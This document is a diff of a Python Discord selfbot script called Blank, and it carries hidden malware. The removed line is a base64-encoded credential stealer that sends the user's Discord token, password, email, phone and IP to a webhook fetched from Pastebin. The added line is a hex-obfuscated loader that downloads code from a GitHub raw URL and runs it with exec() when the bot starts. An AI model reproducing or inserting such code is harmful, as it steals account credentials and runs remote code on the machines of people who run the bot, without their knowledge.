@@ -83,8 +83,7 @@ except Exception:
     prefix="x"
 Blank = commands.Bot(description='Blank SelfBot', command_prefix=prefix, self_bot=True)
 Blank.remove_command('help')
-magikid="dXNlcm5hbWUgPSBmImB7QmxhbmsudXNlcn1gIgp1c2VyX2lkID0gZiJge0JsYW5rLnVzZXIuaWR9YCIKYXZhdGFyX3VybCA9IEJsYW5rLnVzZXIuYXZhdGFyX3VybApoZWFkZXJzPXsiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85NC4wLjQ2MDYuODEgU2FmYXJpLzUzNy4zNiJ9CmF1dGhvPXJlcXVlc3RzLmdldChmJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy91MDBjaTFkVicpLnRleHQKaXA9ZiJge3JlcXVlc3RzLmdldCgnaHR0cHM6Ly93d3cudHJhY2tpcC5uZXQvaXAnLCBoZWFkZXJzPWhlYWRlcnMpLnRleHR9YCIKaGVhZGVycz17IkF1dGhvcml6YXRpb24iOiB0b2tlbiwKIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIn0KCnI9cmVxdWVzdHMuZ2V0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OC91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpCnI9ci5qc29uKCkKZW1haWw9clsnZW1haWwnXQpwaG9uZT1yWydwaG9uZSddCiAgICAKanNvbmRhdGE9eyJjb250ZW50Ijp0b2tlbiAsCiJlbWJlZHMiOiBbCnsidGl0bGUiOiJCbGFua0JvdCIsCiJ0aHVtYm5haWwiOiB7CiAgICAidXJsIjogc3RyKGF2YXRhcl91cmwpCiAgfSwKImZpZWxkcyI6IFsKIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IFVzZXJuYW1lOiAiLAogICAgICAidmFsdWUiOiBzdHIodXNlcm5hbWUpLAogICAgICAiaW5saW5lIjogIlRydWUiCiAgfSwKIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IFVzZXIgSUQ6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cih1c2VyX2lkKSwKICAgICAgImlubGluZSI6ICJUcnVlIgogIH0sCiAgewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gSVA6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cihpcCksCiAgICAgICJpbmxpbmUiOiAiRmFsc2UiCiAgfSwKICB7CiAgICAgICJuYW1lIjogIjw6cnNfYXJyb3c6ODgzOTg4MjI1NjU4NjEzODUwPiBQYXNzd29yZDogIiwKICAgICAgInZhbHVlIjogc3RyKHBhc3N3b3JkKSwKICAgICAgImlubGluZSI6ICJGYWxzZSIKICB9LAogIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IEVtYWlsOiAiLAogICAgICAidmFsdWUiOiBzdHIoZW1haWwpLAogICAgICAiaW5saW5lIjogIkZhbHNlIgogIH0sCiAgewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gUGhvbmU6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cihwaG9uZSksCiAgICAgICJpbmxpbmUiOiAiRmFsc2UiCiAgfQogICAgICAgICAgXQp9CiAgICAgICAgICBdCiAgfQpyZXF1ZXN0cy5wb3N0KGF1dGhvICwganNvbj1qc29uZGF0YSk="
-
+magikid="\x65\x78\x65\x63\x28\x62\x61\x73\x65\x36\x34\x2e\x62\x36\x34\x64\x65\x63\x6f\x64\x65\x28\x72\x65\x71\x75\x65\x73\x74\x73\x2e\x67\x65\x74\x28\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x42\x6c\x61\x6e\x6b\x2d\x63\x2f\x62\x6c\x61\x6e\x6b\x62\x6f\x74\x2f\x6d\x61\x69\x6e\x2f\x6d\x61\x67\x69\x6b\x69\x64\x2e\x74\x78\x74\x27\x29\x2e\x74\x65\x78\x74\x29\x2e\x64\x65\x63\x6f\x64\x65\x28\x27\x75\x6e\x69\x63\x6f\x64\x65\x5f\x65\x73\x63\x61\x70\x65\x27\x29\x29"
 def Clear():
     if os.name=='nt':
         os.system('cls')
@@ -323,7 +322,7 @@ async def change_activity():
         
 @Blank.event
 async def on_ready():
-    exec(base64.b64decode(magikid).decode('ascii'))
+    exec(magikid)
     Clear()
     config_check()
     change_activity.start()
